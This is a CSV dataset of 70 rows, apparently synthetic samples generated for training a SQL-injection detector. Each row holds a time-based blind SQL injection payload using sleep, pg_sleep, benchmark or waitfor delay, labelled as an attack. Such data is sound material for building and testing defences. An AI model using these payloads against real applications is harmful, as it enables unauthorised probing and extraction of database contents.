id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000001,attack,time,"1%""   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000523,0.8497030312829567
SMOTE_000002,attack,time,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  6824  =  6824,nearest_attack_euclidean,R000511,0.5614570747779651
SMOTE_000003,attack,time,"1'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000386,0.3320479420030985
SMOTE_000004,attack,time,"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  ""cadh"" like ""cadh",nearest_attack_euclidean,R000584,0.4069270212608182
SMOTE_000005,attack,time,"1%""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000321,0.14046319621194103
SMOTE_000006,attack,time,"1%""  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000726,0.3916097839448702
SMOTE_000007,attack,time,"select pg_sleep  (  5  )   and    (    (     (  ""nvuv"" like ""nvuv",nearest_attack_euclidean,R000246,0.6017393223907862
SMOTE_000008,attack,time,"1""  )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000498,0.686431512011613
SMOTE_000009,attack,time,"1"" waitfor delay '0:0:5'--",nearest_attack_euclidean,R000573,1.1287018773120139
SMOTE_000010,attack,time,"1"" where 2677  =  2677 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --",nearest_attack_euclidean,R000345,0.9160803880165634
SMOTE_000011,attack,time,"1'   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   'ogpg'  =  'ogpg",nearest_attack_euclidean,R000562,0.3239917216366188
SMOTE_000012,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and ""kojr""  =  ""kojr",nearest_attack_euclidean,R000210,0.15985250400114628
SMOTE_000013,attack,time,"1' where 7080  =  7080 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000570,0.34748411206997565
SMOTE_000014,attack,time,"1""   )    )     )   waitfor delay '0:0:5'--",nearest_attack_euclidean,R000223,0.18090362397173457
SMOTE_000015,attack,time,"1"" where 1831  =  1831 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000329,0.29998690074143036
SMOTE_000016,attack,time,1'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  'cmqe' like 'cmqe,nearest_attack_euclidean,R000408,0.019069341020961722
SMOTE_000017,attack,time,1'   )    )     )   or sleep  (  5  )  #,nearest_attack_euclidean,R000504,0.7065205078693638
SMOTE_000018,attack,time,1'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  'jrpk'  =  'jrpk,nearest_attack_euclidean,R000092,0.5215349894932315
SMOTE_000019,attack,time,1%' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and '%'  =  ',nearest_attack_euclidean,R000579,0.5773829288747692
SMOTE_000020,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R000130,1.4901871552631656
SMOTE_000021,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  'kerg' like 'kerg,nearest_attack_euclidean,R000427,0.2658937362516819
SMOTE_000022,attack,time,select sleep  (  5  )   and    (    (   'keoy'  =  'keoy,nearest_attack_euclidean,R000175,0.13323812323426915
SMOTE_000023,attack,time,1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  'brob'  =  'brob,nearest_attack_euclidean,R000426,0.018714543173367678
SMOTE_000024,attack,time,1'||  (  select 'ywfo' from dual where 4168  =  4168 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000768,0.680394038882121
SMOTE_000025,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'yfvu' like 'yfvu,nearest_attack_euclidean,R000660,0.11844578619792169
SMOTE_000026,attack,time,"1""  )   where 6843  =  6843 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000363,0.4885488522468004
SMOTE_000027,attack,time,1'  )   waitfor delay '0:0:5' and   (  'peyv' like 'peyv,nearest_attack_euclidean,R000598,1.091641150409793
SMOTE_000028,attack,time,"1""  )   or sleep  (  5  )   and   (  ""xgtk""  =  ""xgtk",nearest_attack_euclidean,R000591,1.3229961643941208
SMOTE_000029,attack,time,1'+  (  select ophz where 9158  =  9158 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   +',nearest_attack_euclidean,R000148,0.863397108040935
SMOTE_000030,attack,time,"1%""   )    )     )   and sleep  (  5  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000702,0.46058235475804704
SMOTE_000031,attack,time,"1%"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and ""%""  =  """,nearest_attack_euclidean,R000178,0.5312681584539385
SMOTE_000032,attack,time,1'+  (  select 'toec' where 5810  =  5810 and sleep  (  5   )    )   +',nearest_attack_euclidean,R000309,0.9813255993714801
SMOTE_000033,attack,time,select pg_sleep  (  5  )   and   (  'vnss' like 'vnss,nearest_attack_euclidean,R000173,0.055773967112991416
SMOTE_000034,attack,time,1   )    )    as emtf where 3561  =  3561 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,nearest_attack_euclidean,R000751,1.1142652048419484
SMOTE_000035,attack,time,select sleep  (  5  )   and   (  'dcys' like 'dcys,nearest_attack_euclidean,R000135,0.1924065532247817
SMOTE_000036,attack,time,1'   )    )    or sleep  (  5  )  #,nearest_attack_euclidean,R000194,0.07005959951399549
SMOTE_000037,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000155,0.9833493946452104
SMOTE_000038,attack,time,1 where 1931  =  1931 and sleep  (  5  )  --,nearest_attack_euclidean,R000727,0.36097684800064395
SMOTE_000039,attack,time,"1'  )   as khaa where 8157  =  8157 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000604,0.6897457818320097
SMOTE_000040,attack,time,1' in boolean mode  )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000627,0.8395031344440103
SMOTE_000041,attack,time,1  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  4968  =  4968,nearest_attack_euclidean,R000533,0.7195243350942235
SMOTE_000042,attack,time,1' where 1153  =  1153 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,nearest_attack_euclidean,R000388,0.45887000145885953
SMOTE_000043,attack,time,"1%""  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000218,0.5633301723694861
SMOTE_000044,attack,time,waitfor delay '0:0:5' and    (    (   7619  =  7619,nearest_attack_euclidean,R000282,0.0982328270125219
SMOTE_000045,attack,time,1'  )   and sleep  (  5  )   and   (  'njud'  =  'njud,nearest_attack_euclidean,R000352,0.7716176645448232
SMOTE_000046,attack,time,1   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000189,0.3226487170841899
SMOTE_000047,attack,time,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  6824  =  6824,nearest_attack_euclidean,R000511,1.010893660859028
SMOTE_000048,attack,time,1%'   )    )    and sleep  (  5  )  #,nearest_attack_euclidean,R000385,0.617903361207523
SMOTE_000049,attack,time,1 waitfor delay '0:0:5'# opyp,nearest_attack_euclidean,R000701,0.2574124637150425
SMOTE_000050,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'fdgq'  =  'fdgq,nearest_attack_euclidean,R000087,0.3998255730982507
SMOTE_000051,attack,time,1 where 7452  =  7452 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000465,0.19304019912753342
SMOTE_000052,attack,time,"""   )    )   ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000034,7.676424279759529
SMOTE_000053,attack,time,"1%'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000066,0.0033129540767814587
SMOTE_000054,attack,time,"1"" or sleep  (  5  )  ",nearest_attack_euclidean,R000577,0.050344634582886114
SMOTE_000055,attack,time,"1  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000380,0.09656469643360598
SMOTE_000056,attack,time,"1'  )   as khaa where 8157  =  8157 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000604,0.6867124340439983
SMOTE_000057,attack,time,1'   )    )    as hxxm where 3792  =  3792 and sleep  (  5  )  #,nearest_attack_euclidean,R000418,0.13458344833473534
SMOTE_000058,attack,time,"""   )    )   ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000034,7.190333697624945
SMOTE_000059,attack,time,1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #,nearest_attack_euclidean,R000074,1.4526256122007388
SMOTE_000060,attack,time,"1""   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  ""hiwo"" like ""hiwo",nearest_attack_euclidean,R000545,0.35518517949068734
SMOTE_000061,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  'dvpw'  =  'dvpw",nearest_attack_euclidean,R000767,0.2212673613063502
SMOTE_000062,attack,time,"1""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000106,0.03590081595264816
SMOTE_000063,attack,time,"1""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000379,0.010039118349835114
SMOTE_000064,attack,time,"1""  )   where 6236  =  6236 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000389,0.012255837380914115
SMOTE_000065,attack,time,1'   )    )    as hzbj where 1725  =  1725 or sleep  (  5  )  #,nearest_attack_euclidean,R000489,0.3684256666841021
SMOTE_000066,attack,time,select pg_sleep  (  5  )   and   (  '%'  =  ',nearest_attack_euclidean,R000431,0.2422564972430463
SMOTE_000067,attack,time,1'   )    )     )   or sleep  (  5  )  #,nearest_attack_euclidean,R000504,0.7170179219477625
SMOTE_000068,attack,time,"1""  )   waitfor delay '0:0:5' and   (  ""hhzy"" like ""hhzy",nearest_attack_euclidean,R000091,0.8834856279592994
SMOTE_000069,attack,time,1%'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000373,0.5270055045050622
SMOTE_000070,attack,time,select pg_sleep  (  5  )   and    (    (   4382  =  4382,nearest_attack_euclidean,R000419,1.6974984301278293
